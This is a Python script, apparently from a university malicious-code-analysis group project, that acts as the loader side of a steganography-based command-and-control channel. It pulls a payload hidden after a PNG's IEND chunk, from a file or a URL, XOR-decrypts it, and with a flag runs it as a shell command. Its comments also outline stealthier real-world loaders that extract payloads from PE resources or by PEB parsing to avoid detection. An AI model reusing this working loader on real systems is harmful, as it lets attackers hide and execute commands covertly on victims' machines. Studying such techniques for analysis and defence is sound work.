#!/usr/bin/env python3
"""
Payload Extractor - EOF Technique (simulates C/C++ loader)
Extracts payloads appended after the PNG IEND chunk.

This simulates what the C/C++ payload-extractor-from-file.cpp does in the
real hide-payload-in-images project. In a real attack, this extraction
and execution would happen in a compiled C/C++ binary (or via Adaptix C2
beacon) to avoid detection. We use Python here for demo clarity.

Real-world extraction methods (from the original project):
  1. From disk: read file, seek past original image size, read payload
  2. From .rsrc section: embed image in PE resources, extract via WinAPI
  3. From .rsrc via PEB: manual PE header parsing (no WinAPI calls = stealthier)

CMU Heinz College - 95-759 Malicious Code Analysis
Group Project: Steganography-Based C2 Channel

Usage:
    python payload_extractor.py <image> [--xor-key KEY]

Examples:
    python payload_extractor.py images/embedded_eof.png
    python payload_extractor.py images/embedded_eof.png --xor-key 0x4D
    python payload_extractor.py http://localhost:8080/embedded_eof.png --xor-key 0x4D
"""

import argparse
import io
import struct
import subprocess
import sys

import requests


# PNG IEND chunk bytes
PNG_IEND_MARKER = b'\x00\x00\x00\x00IEND\xaeB`\x82'


def xor_decrypt(data, key):
    """XOR decrypt data with a single-byte key (same as encrypt - XOR is symmetric)."""
    return bytes([b ^ key for b in data])


def find_iend_offset(image_data):
    """Find the byte offset where the PNG IEND chunk ends."""
    pos = image_data.find(PNG_IEND_MARKER)
    if pos == -1:
        return -1
    return pos + len(PNG_IEND_MARKER)


def extract_payload(image_data, xor_key=None):
    """Extract the hidden payload from after the IEND chunk."""

    total_size = len(image_data)

    # Verify PNG
    if image_data[:8] != b'\x89PNG\r\n\x1a\n':
        print("[-] ERROR: Not a valid PNG file.")
        sys.exit(1)

    # Find IEND
    iend_offset = find_iend_offset(image_data)
    if iend_offset == -1:
        print("[-] ERROR: Could not find PNG IEND chunk.")
        sys.exit(1)

    print(f"[*] PNG IEND chunk ends at byte: {iend_offset}")
    print(f"[*] Total file size: {total_size:,} bytes")

    # Check for appended data
    appended_size = total_size - iend_offset
    if appended_size <= 0:
        print("[-] No data found after IEND chunk.")
        print("[-] This image does not contain an EOF-appended payload.")
        sys.exit(1)

    print(f"[*] Data after IEND: {appended_size:,} bytes")

    # Read the 4-byte size header
    if appended_size < 4:
        print("[-] ERROR: Appended data too small to contain size header.")
        sys.exit(1)

    payload_size = struct.unpack('<I', image_data[iend_offset:iend_offset + 4])[0]
    print(f"[*] Payload size from header: {payload_size:,} bytes")

    # Validate
    available = appended_size - 4
    if payload_size > available:
        print(f"[-] ERROR: Header claims {payload_size} bytes but only {available} available.")
        sys.exit(1)

    # Extract payload
    print("[*] Extracting payload bytes...")
    payload_bytes = image_data[iend_offset + 4: iend_offset + 4 + payload_size]

    # XOR decrypt if key provided
    if xor_key is not None:
        print(f"[*] XOR decrypting with key: 0x{xor_key:02X}")
        payload_bytes = xor_decrypt(payload_bytes, xor_key)

    return payload_bytes


def load_from_url(url):
    """Download image data from a URL."""
    print(f"[*] Fetching image from {url} ...")
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
    except requests.exceptions.ConnectionError:
        print(f"[-] ERROR: Could not connect to {url}")
        sys.exit(1)
    except requests.exceptions.HTTPError as e:
        print(f"[-] ERROR: HTTP error: {e}")
        sys.exit(1)
    print(f"[*] Downloaded: {len(response.content):,} bytes")
    return response.content


def load_from_file(path):
    """Read image data from a local file."""
    print(f"[*] Loading image from file: {path}")
    try:
        with open(path, 'rb') as f:
            return f.read()
    except FileNotFoundError:
        print(f"[-] ERROR: File not found: {path}")
        sys.exit(1)


def main():
    parser = argparse.ArgumentParser(
        description="Payload Extractor - Extract hidden payloads from after PNG IEND chunk",
        epilog="Example: python payload_extractor.py images/embedded_eof.png --xor-key 0x4D"
    )
    parser.add_argument("source", help="URL or local file path of the embedded PNG image")
    parser.add_argument(
        "--xor-key", "-x",
        type=lambda x: int(x, 0),
        default=None,
        help="XOR key used during embedding (0-255)"
    )
    parser.add_argument(
        "--execute", "-e",
        action="store_true",
        help="Execute extracted payload as a shell command"
    )
    parser.add_argument(
        "--save", "-s",
        type=str,
        default=None,
        help="Save extracted payload to a file"
    )

    args = parser.parse_args()

    print("=" * 60)
    print("  PAYLOAD EXTRACTOR - EOF Append Technique")
    print("  (Simulating C/C++ loader from hide-payload-in-images)")
    print("=" * 60)
    print()

    # Load image data
    if args.source.startswith("http://") or args.source.startswith("https://"):
        image_data = load_from_url(args.source)
    else:
        image_data = load_from_file(args.source)

    # Extract payload
    payload_bytes = extract_payload(image_data, args.xor_key)

    # Display results
    print()

    # Try to decode as text
    try:
        command = payload_bytes.decode('utf-8')
        is_text = all(c.isprintable() or c in '\n\r\t' for c in command)
    except UnicodeDecodeError:
        command = None
        is_text = False

    if is_text and command:
        print(f"[+] Extracted payload (text): {command}")
    else:
        print(f"[+] Extracted payload ({len(payload_bytes)} bytes, binary)")
        # Show hex dump of first 64 bytes
        hex_preview = payload_bytes[:64].hex(' ')
        print(f"[+] Hex preview: {hex_preview}")
        if len(payload_bytes) > 64:
            print(f"    ... ({len(payload_bytes) - 64} more bytes)")

    # Save to file if requested
    if args.save:
        with open(args.save, 'wb') as f:
            f.write(payload_bytes)
        print(f"[+] Payload saved to: {args.save}")

    # Execute if requested and payload is text
    if args.execute:
        if is_text and command:
            print()
            print(f"[*] Executing command: {command}")
            print("[+] Command output:")
            print("=" * 60)
            try:
                result = subprocess.run(
                    command, shell=True, capture_output=True, text=True, timeout=30
                )
                if result.stdout:
                    print(result.stdout)
                if result.stderr:
                    print("[stderr]:", result.stderr)
            except subprocess.TimeoutExpired:
                print("[-] Command timed out.")
            print("=" * 60)
        else:
            print()
            print("[*] Payload is binary data - skipping text execution.")
            print("[*] In a real attack, this would be shellcode executed via:")
            print("    - VirtualAlloc + memcpy + callback (from-file method)")
            print("    - FindResource + LockResource (from-.rsrc method)")
            print("    - PEB parsing (stealthiest, no WinAPI calls)")

    print()
    print("=" * 60)


if __name__ == "__main__":
    main()
